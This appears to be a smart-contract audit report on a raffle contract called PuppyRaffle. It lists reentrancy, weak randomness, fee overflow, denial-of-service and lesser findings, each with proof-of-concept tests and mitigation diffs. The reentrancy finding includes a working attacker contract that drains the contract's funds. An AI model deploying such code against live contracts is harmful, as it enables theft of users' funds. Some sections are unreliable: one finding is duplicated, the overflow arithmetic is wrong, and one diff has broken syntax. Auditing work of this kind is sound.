# High

### [H-1] Reentrancy attack in `PuppyRaffle:refund` allows entrant to drain raffle balance

**Description:** 

The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript

    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }

```
A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle 
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary> PoC </summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```javascript

    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);

        address attackUser = makeAddr("attackUser");

        vm.deal(attackUser, 1 ether);

        uint256 startingAttackerContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance: ", startingAttackerContractBalance);
        console.log("starting contractbalance: ", startingContractBalance);

        console.log("starting attacker contract balance: ", address(attackerContract).balance);
        console.log("starting contractbalance: ", address(puppyRaffle).balance);
    }

```

And this contract as well

```javascript

    contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```

</details>


**Recommended Mitigation:** To prevent this we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff

    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }

```

### [H-2] Week randomness in `PuppyRaffle:selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** 

Hashing `msg.sender`, `block.timestamp`, and `block.dificulty` together creates a predictable find number. A predictable number is not a good random numer. Malicious users can manipulate the values or know them ahead of time to choose the winner of the raffle themselves.

*Note* This additionally means users could front-run this function and call `refund` if they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle a gas war as to who wins the raffles.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.dificulty` and use that to predict when/how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if theu do not like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VRF.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** 

In solidity versions prior to `0.8.0` integers were subject to integer overflows.

```javascript

uint64 myVar = type(uint64).max
// 18,446,744,073,709,551,615
myVar = myVar + 1
//myVar will be 0

```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflow, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. We conclude a raffle of 4 players.
2. We then have 89 players eneter a new raffle, and conclude the raffle.
3. `totalFees` will be:

```javascript

totalFees = totalFees + uint64(fee);
//aka
totalFees = 800000000000000000 + 178000000000000000; 
// and this will overflow!
totalFees = 18,446,744,073,709,551,615

```
4. You will not be able to withdraw, due to the line in `PuppyRaffle:withdrawFees()`

```

    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");


```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.


<details>
<summary> PoC </summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```javascript

    function testOverflow() public {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 playersNum = 100;
        entranceFee = 1 ether;

        address[] memory players = new address[](playersNum);

        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        puppyRaffle.selectWinner();

        console.log(uint256(puppyRaffle.totalFees()));
        console.log((playersNum * entranceFee) * 20 / 100);

        assert(uint256(puppyRaffle.totalFees()) < (playersNum * entranceFee) * 20 / 100);
    }

```

</details>


**Recommended Mitigation:** There are a few recommendations.

1. Use a newer version of solidity, and a `uint256` instaed of `uint64` for `PuppyRaffle:totalFees`.
2. You could also us the `SafeMath` library of OpenZeppelin for version 0.7.6 of solidity, however you would still have a hard timr with the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdrawFees`

```diff

    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");


```
There are more attack vectors with that final require, so we recommend removing it regardless. 

# Medium

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaflle` is a potential denial of service(DoS) attack, incrementing gas costs for future entrants

**Description:** 

The `PuppyRaffle::enterRaflle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript

//@audit DOS Attack
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

an attacker might make the `PuppyRaffle::players` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:
-1st 100 players: ~6252048 gas
-2nd 100 players: ~18068138 gas

This more than 3x more expensive for the second 100 players.

<details>
<summary> PoC </summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```javascript

function test_DOS() public {
        vm.txGasPrice(1);

        uint256 palyersNum = 100;

        address[] memory players = new address[](palyersNum);

        for (uint256 i = 0; i < palyersNum; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        address[] memory players2 = new address[](palyersNum);

        for (uint256 i = 0; i < palyersNum; i++) {
            players2[i] = address(i + palyersNum);
        }

        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
        uint256 gasEnd2 = gasleft();
        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;

        assert(gasUsedFirst < gasUsedSecond);
    }

```

</details>


**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check does not prevent the same person from entering, multiple times, only the same wallet address.

2. Consider using a mapping to check for duplicates, This would allow constant time lookup of whether a user has already entered.

```diff

+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");

```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet).

### [M-2] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** 

In solidity versions prior to `0.8.0` integers were subject to integer overflows.

```javascript

uint64 myVar = type(uint64).max
// 18,446,744,073,709,551,615
myVar = myVar + 1
//myVar will be 0

```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflow, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. We conclude a raffle of 4 players.
2. We then have 89 players eneter a new raffle, and conclude the raffle.
3. `totalFees` will be:

```javascript

totalFees = totalFees + uint64(fee);
//aka
totalFees = 800000000000000000 + 178000000000000000; 
// and this will overflow!
totalFees = 18,446,744,073,709,551,615

```
4. You will not be able to withdraw, due to the line in `PuppyRaffle:withdrawFees()`

```

    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");


```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.


<details>
<summary> PoC </summary>

Place the following test into `PuppyRaffleTest.t.sol`.

```javascript

    function testOverflow() public {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 playersNum = 100;
        entranceFee = 1 ether;

        address[] memory players = new address[](playersNum);

        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        puppyRaffle.selectWinner();

        console.log(uint256(puppyRaffle.totalFees()));
        console.log((playersNum * entranceFee) * 20 / 100);

        assert(uint256(puppyRaffle.totalFees()) < (playersNum * entranceFee) * 20 / 100);
    }

```

</details>


**Recommended Mitigation:** There are a few recommendations.

1. Use a newer version of solidity, and a `uint256` instaed of `uint64` for `PuppyRaffle:totalFees`.
2. You could also us the `SafeMath` library of OpenZeppelin for version 0.7.6 of solidity, however you would still have a hard timr with the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdrawFees`

```diff

    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");


```
There are more attack vectors with that final require, so we recommend removing it regardless. 

### [M-3] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest

**Description:**

The `PuppyRaffle::selectWinner()` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejectspayment, the lottery will not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could  enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact:** 

The `PuppyRaffle:selectWinner` function could revert many times, making a lottery reset difficult.

Also, true winners will not get paid out and someone else could take their money!

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.

2. The lottery ends

3. The `selectWinner` function wouldnt work, even though the lottery is over!

**Recommended Mitigation:** 

There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)

2. Create a mapping of addresses -> payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their prize. (Recommended)

Pull >> Push

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex`returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorectly think they have not entered the raffle

**Description** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 is the player is not in the array

```javascript

    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```

**Impact**

A player at index 0 to incorectly think they have not entered the raffle, and attemp to enter the raffle again, wasting gas.

**Prove of Concept**

1. User enters raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

**Recommended Mitigation**

The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.



# Gas

### [G-1] Unchanged state variable should be declared constant or immutable.

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+       uint256 playerLength = players.length
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

# Information

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

    ```solidity
    pragma solidity ^0.7.6;
    ```

</details>

### [I-2]: Using an outdated version of Solidity is not recommended.

**Description**
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least `0.8.0`) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol [Line: 224](src/PuppyRaffle.sol#L224)

    ```solidity
            feeAddress = newFeeAddress;
    ```

</details>

### [I-4]: `PuppyRaffle::selectWinner` does not follow CEI, which is not a bast practice

It is best to keep code clean and follow CEI (Check, Effects, Impacts).

```dif

-   bool success,) = winner.call{value: prizePool}("");
-   require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
+   bool success,) = winner.call{value: prizePool}("");
+   require(success, "PuppyRaffle: Failed to send prize pool to winner");

```

### [I-5]: Use of "magic" numbers is discouraged

It can be confucing to see number literals in a codebase, and it's much more readable  if the numbers are given a name.


Examples:

```javascript

    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
        
```
Instead, you could use:

```javascript

    uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    uint256 public constant FEE_PERCENTAGE = 20;
    uint256 public constant POOL_PERCISION = 100;

```

### [I-6]: State changes are missing events

### [I-7]: `PuppyRaffle::_isActivePlayer` is never used and should be removed 
